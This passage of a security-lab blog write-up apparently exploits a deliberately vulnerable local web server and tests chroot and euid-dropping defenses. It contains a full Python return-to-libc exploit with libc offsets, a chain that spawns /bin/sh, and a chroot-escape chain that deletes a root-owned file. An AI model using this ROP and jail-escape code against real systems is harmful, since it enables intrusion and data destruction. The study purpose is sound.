socket.SOCK_STREAM)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connecting to %s:%d...&quot;</span> % (host, port))  </span><br><span class="line">    sock.connect((host, port))  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connected, sending request...&quot;</span>)  </span><br><span class="line">    sock.send(req)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request sent, waiting for reply...&quot;</span>)  </span><br><span class="line">    rbuf = sock.recv(<span class="number">1024</span>)  </span><br><span class="line">    resp = (<span class="string">&quot;&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)  </span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(rbuf):  </span><br><span class="line">      resp = resp+rbuf  </span><br><span class="line">      rbuf = sock.recv(<span class="number">1024</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received reply.&quot;</span>)  </span><br><span class="line">    sock.close()  </span><br><span class="line">    <span class="keyword">return</span> resp  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; type&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;type: 1 for shell, 2 for unlink&quot;</span>)  </span><br><span class="line">    exit()  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">try</span>:  </span><br><span class="line">    shellcode = <span class="string">&quot;&quot;</span>  </span><br><span class="line">    req = build_exploit(shellcode, <span class="built_in">int</span>(sys.argv[<span class="number">1</span>]))  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP request:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(req)  </span><br><span class="line">  </span><br><span class="line">    resp = send_req(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">80</span>, req)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP response:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(resp)  </span><br><span class="line"><span class="keyword">except</span>:  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Exception:&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(traceback.format_exc())  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="problems-encountered">Problems Encountered</h3>
+<ol type="1">
+<li><p>When the server process ends and restarts, socket binding failure
+often occurs because port 80 is occupied. Port 80 is the default port of
+Apache server, so this problem can be solved by modifying Apache’s
+default port to 8080.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo su  </span><br><span class="line">systemctl disable apache2  </span><br><span class="line">vim /etc/apache2/ports.conf  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Change Listen 80... to: Listen 8080</span></span><br><span class="line">vim /etc/apache2/sites-available/000-default.conf  </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Change &lt;VirtualHost *:80&gt;... to: &lt;VirtualHost *:8080&gt;</span></span><br><span class="line">systemctl restart apache2  </span><br></pre></td></tr></table></figure></li>
+</ol>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619105721675.png"
+alt="Image when Apache service listening port modification is successful" />
+<figcaption aria-hidden="true">Image when Apache service listening port
+modification is successful</figcaption>
+</figure>
+<ol start="2" type="1">
+<li><p>I found that the ebp value changed when executing touchstone
+through setuid and sudo in these two different ways.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./touchstone</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619162514457.png"
+alt="image-20240619162514457" />
+<figcaption aria-hidden="true">image-20240619162514457</figcaption>
+</figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./touchstone</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619162549093.png"
+alt="image-20240619162549093" />
+<figcaption aria-hidden="true">image-20240619162549093</figcaption>
+</figure>
+<p>AI Answer: <code>setuid</code> and <code>sudo</code> provide
+different privilege escalation mechanisms. <code>setuid</code> runs the
+executable file with the file owner’s privileges by setting the
+executable file’s permissions, while <code>sudo</code> allows authorized
+users to temporarily elevate privileges to execute specific commands.
+The change in <code>ebp</code> value may be caused by different
+execution environments and security mechanisms, especially when
+involving privilege escalation.</p></li>
+</ol>
+<h2
+id="use-chroot-to-constrain-web-server-perform-exploit-delete-root-privilege-file-tmptest">Use
+chroot to constrain web server, perform exploit, delete root privilege
+file /tmp/test</h2>
+<h3 id="experiment-environment-configuration-1">Experiment Environment
+Configuration</h3>
+<p>To avoid affecting the previous experiment’s results, copy the code
+directory to code_chroot. Of course, still need to disable address
+randomization to avoid address changes.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_chroot</span><br></pre></td></tr></table></figure>
+<h3 id="perform-chroot-configuration">Perform chroot configuration</h3>
+<p>Add the following code in server.c:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">chroot</span>(<span class="string">&quot;/jail&quot;</span>) == <span class="number">0</span>)  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;chroot success\n&quot;</span>);  </span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619132459140.png"
+alt="image-20240619132459140" />
+<figcaption aria-hidden="true">image-20240619132459140</figcaption>
+</figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">make  </span><br><span class="line">sudo ./chroot-setup.sh  </span><br><span class="line">cd /jail  </span><br><span class="line">sudo ./touchstone  </span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619132644219.png"
+alt="image-20240619132644219" />
+<figcaption aria-hidden="true">image-20240619132644219</figcaption>
+</figure>
+<h3 id="perform-exploit-test">Perform exploit test</h3>
+<p>Create test files then start the server, found that “chroot success”
+information was successfully printed.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create <span class="built_in">test</span> file <span class="keyword">in</span> tmp directory</span>  </span><br><span class="line">sudo touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create <span class="built_in">test</span> file <span class="keyword">in</span> /jail/tmp directory</span></span><br><span class="line">sudo touch /jail/tmp/test.txt</span><br><span class="line">sudo chown root /jail/tmp/test.txt  </span><br><span class="line">ll /jail/tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start server <span class="keyword">in</span> /jail directory</span></span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://picx.zhimg.com/80/v2-9a3d6da5f1d453d9edec1ee0bfbebcf2_720w.png"
+alt="image-20240619135337160" />
+<figcaption aria-hidden="true">image-20240619135337160</figcaption>
+</figure>
+<p>The server process address information may change, use gdb to recheck
+(note that using ldd here is wrong, although it shows the same as
+before, need to use gdb to dynamically attach to see addresses).</p>
+<p>Hint from the manual: The library in jail is separate, located under
+<code>/jail/lib</code> (different from the original path), so need to
+re-find the libc base address</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep banksv</span><br><span class="line">sudo gdb -q -p &lt;PID&gt;</span><br><span class="line">info proc map</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619133412947.png"
+alt="image-20240619133412947" />
+<figcaption aria-hidden="true">image-20240619133412947</figcaption>
+</figure>
+<figure>
+<img
+src="https://pic1.zhimg.com/80/v2-4373262ae41bde082db5e2dc19fefb11_720w.png"
+alt="image-20240619133327610" />
+<figcaption aria-hidden="true">image-20240619133327610</figcaption>
+</figure>
+<p>Modify the script’s <code>base_addr</code> as
+<code>exploit_2.py</code>, then execute the delete file function. Found
+that <code>\tmp\text.txt</code> was not successfully deleted, but
+<code>\jail\tmp\text.txt</code> was deleted. Using <code>dmesg</code> to
+check kernel debug information found no <code>segmentfault</code>,
+indicating that <code>chroot</code> is effective, and test files outside
+the <code>jail</code> directory were not deleted.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619152219338.png"
+alt="image-20240619152219338" />
+<figcaption aria-hidden="true">image-20240619152219338</figcaption>
+</figure>
+<h3 id="delete-tmptest.txt-file">Delete /tmp/test.txt file</h3>
+<figure>
+<img
+src="C:\Users\11946\AppData\Roaming\Typora\typora-user-images\image-20240621163129108.png"
+alt="image-20240621163129108" />
+<figcaption aria-hidden="true">image-20240621163129108</figcaption>
+</figure>
+<p>Then try to delete the <code>/tmp/test.txt</code> file. This requires
+using chroot and chdir related calls to implement, so first need to find
+the related addresses.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;chroot&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot;chdir&quot; </span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621152017101.png"
+alt="image-20240621152017101" />
+<figcaption aria-hidden="true">image-20240621152017101</figcaption>
+</figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d banksv</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621152216367.png"
+alt="image-20240621152216367" />
+<figcaption aria-hidden="true">image-20240621152216367</figcaption>
+</figure>
+<p>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc base address</span></span><br><span class="line"><span class="comment"># ASLR shoud be off, so that libc&#x27;s base address will not change untill next reboot </span></span><br><span class="line"><span class="comment"># you can use &quot;ldd ./program&quot; to check the libc base address</span></span><br><span class="line">base_addr = <span class="number">0xf7db2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># all of the offsets of functions (strings) inside libc won&#x27;t change much (sometimes changed, so check is needed) .</span></span><br><span class="line"><span class="comment"># to get the offset of a funtion, you can use:</span></span><br><span class="line"><span class="comment">##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;</span></span><br><span class="line"><span class="comment"># to get &quot;/bin/sh&quot;:</span></span><br><span class="line"><span class="comment">## ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system</span></span><br><span class="line">sys_addr = base_addr + <span class="number">0x00041780</span> </span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line">sh_addr  = base_addr + <span class="number">0x0018e363</span></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">ex_addr  = base_addr + <span class="number">0x000340c0</span></span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">ul_addr  = base_addr + <span class="number">0x000f4100</span></span><br><span class="line"><span class="comment"># chroot</span></span><br><span class="line">chr_addr = base_addr + <span class="number">0x000fce60</span></span><br><span class="line"><span class="comment">#chdir</span></span><br><span class="line">chd_addr = base_addr + <span class="number">0x000f2c70</span></span><br><span class="line"><span class="comment"># pop-ret</span></span><br><span class="line">pop_addr = <span class="number">0x080d19a4</span></span><br><span class="line"><span class="comment"># dead</span></span><br><span class="line">d_addr   = <span class="number">0xdeadbeef</span></span><br><span class="line"><span class="comment"># ebp  too make the task simple, we print ebp of getToken function (vulnerable) </span></span><br><span class="line">ebp_addr = <span class="number">0xffffd218</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Below is the function that you should modify to construct an</span></span><br><span class="line"><span class="comment">## HTTP request that will cause a buffer overflow in some part</span></span><br><span class="line"><span class="comment">## of the vulnerable web server and exploit it.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit</span>(<span class="params">shellcode</span>):</span><br><span class="line">    shift_val = <span class="number">19</span> * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    chd_arg = <span class="string">&quot;..\0\0&quot;</span></span><br><span class="line">    chd_arg_addr =  ebp_addr + shift_val</span><br><span class="line"></span><br><span class="line">    chr_arg2 = <span class="string">&quot;server\0\0&quot;</span></span><br><span class="line">    chr_arg2_addr = ebp_addr + shift_val + <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    chr_arg = <span class="string">&quot;.\0\0\0&quot;</span></span><br><span class="line">    chr_arg_addr =  ebp_addr + shift_val + <span class="number">12</span></span><br><span class="line"></span><br><span class="line">    ul_arg = <span class="string">&quot;/tmp/test.txt\0&quot;</span></span><br><span class="line">    ul_arg_addr =   ebp_addr + shift_val + <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    sys_arg = <span class="string">&quot;/bin/sh\0&quot;</span></span><br><span class="line">    sys_arg_addr =  ebp_addr + <span class="number">20</span></span><br><span class="line"></span><br><span class="line">    req = (<span class="string">&quot;POST / HTTP/1.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># All of the header information other than &quot;Content-Length&quot; is not important</span></span><br><span class="line">    req += (<span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># The Content-Length below is useful, and depends on the length of </span></span><br><span class="line">    <span class="comment"># username plus password, you need to use wireshark (together with web browser) </span></span><br><span class="line">    <span class="comment"># for checking the length</span></span><br><span class="line">    req += (<span class="string">&quot;Content-Length: 58\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>) </span><br><span class="line">    req += (<span class="string">&quot;Origin: http://127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;Connection: keep-alive\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;Referer: http://127.0.0.1/\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    req += (<span class="string">&quot;Hacking: &quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># For different oses (and compilation), the length of fillup for </span></span><br><span class="line">    <span class="comment"># hijacking the return address in the stack, could be different,</span></span><br><span class="line">    <span class="comment"># therefore you need to debug the program for checking and adjusting.</span></span><br><span class="line"></span><br><span class="line">    req += <span class="string">b&#x27;A&#x27;</span> * <span class="number">1068</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># remove a file use jail breaking</span></span><br><span class="line">    req += p32(chr_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chr_arg2_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chd_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chd_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chd_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chd_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(chr_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(chr_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(ul_addr)</span><br><span class="line">    req += p32(pop_addr)</span><br><span class="line">    req += p32(ul_arg_addr)</span><br><span class="line"></span><br><span class="line">    req += p32(ex_addr)</span><br><span class="line">    req += p32(<span class="number">0</span>)</span><br><span class="line">    req += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 19 * 4</span></span><br><span class="line">    req += chd_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 19 * 4 + 4</span></span><br><span class="line">    req += chr_arg2.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 16 * 4 + 12</span></span><br><span class="line">    req += chr_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="comment"># 16 * 4 + 16</span></span><br><span class="line">    req += ul_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">    <span class="comment"># Below is the username/password that you can Register into the web server</span></span><br><span class="line">    <span class="comment"># by using web browser. These information will be stored into the sqlite db behind.</span></span><br><span class="line">    <span class="comment"># You need to change these information according to your own registration.</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># Note that successful POST will be responded by the server with a hint page.</span></span><br><span class="line">    <span class="comment"># By using the successful response, you can judge whether the server has been </span></span><br><span class="line">    <span class="comment"># crashed (by exploit), so that you can adjust the fillup accordingly.</span></span><br><span class="line">    req += (<span class="string">&quot;login_username=lixiang&amp;login_password=123456&amp;submit_login=Login&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(req)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line">    <span class="comment">#req += (addr1).to_bytes(4, byteorder=&#x27;little&#x27;)</span></span><br><span class="line">    <span class="comment">#req += (&quot;@@@@&quot;).encode(&#x27;latin-1&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_req</span>(<span class="params">host, port, req</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connecting to %s:%d...&quot;</span> % (host, port))</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Connected, sending request...&quot;</span>)</span><br><span class="line">    sock.send(req)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request sent, waiting for reply...&quot;</span>)</span><br><span class="line">    rbuf = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    resp = (<span class="string">&quot;&quot;</span>).encode(<span class="string">&quot;latin-1&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(rbuf):</span><br><span class="line">      resp=resp+rbuf</span><br><span class="line">      rbuf = sock.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Received reply.&quot;</span>)</span><br><span class="line">    sock.close()</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    shellcode = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(os.path.exists(<span class="string">&quot;shellcode.bin&quot;</span>)):</span><br><span class="line">      shellfile = <span class="built_in">open</span>(<span class="string">&quot;shellcode.bin&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">      shellcode = shellfile.read()</span><br><span class="line">    req = build_exploit(shellcode)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP request:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(req)</span><br><span class="line"></span><br><span class="line">    resp = send_req(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">80</span>, req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HTTP response:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Exception:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(traceback.format_exc())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="defense-result-analysis">Defense Result Analysis</h3>
+<p><code>chroot</code> is a technique used to change the root directory
+of the current process and its child processes. Through
+<code>chroot</code>, a process and its child processes can be restricted
+to a specific directory tree, preventing them from accessing files and
+resources outside the directory tree. This technique is commonly used to
+enhance system security, especially for isolating service programs (such
+as web servers) to limit the scope of potential attack impacts.</p>
+<p><code>chroot</code> changes the root directory of the calling
+process, making the process believe that the specified directory is the
+root directory <code>/</code> of the file system. In this way, the
+process cannot access any files or directories outside this directory,
+thus achieving process isolation to some extent.</p>
+<h2 id="change-process-euid-test-exploit">Change process euid, test
+exploit</h2>
+<h3 id="experiment-environment-configuration-2">Experiment Environment
+Configuration</h3>
+<p>To avoid affecting the previous experiment’s results, copy the code
+directory to code_euid. Of course, still need to disable address
+randomization to avoid address changes.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r ./code ./code_euid</span><br></pre></td></tr></table></figure>
+<h3 id="perform-euid-configuration">Perform euid configuration</h3>
+<p>Add the following code at the fork child process code location in
+server.c:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setresuid</span>(<span class="number">1000</span>,<span class="number">1000</span>,<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;User IDs successfully set to 1000.\n&quot;</span>);</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153144782.png"
+alt="image-20240619153144782" />
+<figcaption aria-hidden="true">image-20240619153144782</figcaption>
+</figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make  </span><br><span class="line">sudo chown root touchstone  </span><br><span class="line">sudo chmod +s touchstone  </span><br></pre></td></tr></table></figure>
+<h3 id="perform-exploit-test-1">Perform exploit test</h3>
+<p>Create test files then start the server, found that “User IDs
+successfully set to 1000” information was successfully printed.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Create <span class="built_in">test</span> file <span class="keyword">in</span> tmp directory</span>  </span><br><span class="line">sudo touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt  </span><br><span class="line">ll /tmp/test.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Start server</span></span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619153651371.png"
+alt="image-20240619153651371" />
+<figcaption aria-hidden="true">image-20240619153651371</figcaption>
+</figure>
+<p>Execute the script. Since there’s no difference from task one and the
+address hasn’t changed, directly use exploit_1.py.</p>
+<p>Perform shell acquisition test, found that shell can be obtained but
+in non-privileged mode.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 1 # Try to get shell</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240621144856371.png"
+alt="image-20240621144856371" />
+<figcaption aria-hidden="true">image-20240621144856371</figcaption>
+</figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 2 # Try to delete file</span><br></pre></td></tr></table></figure>
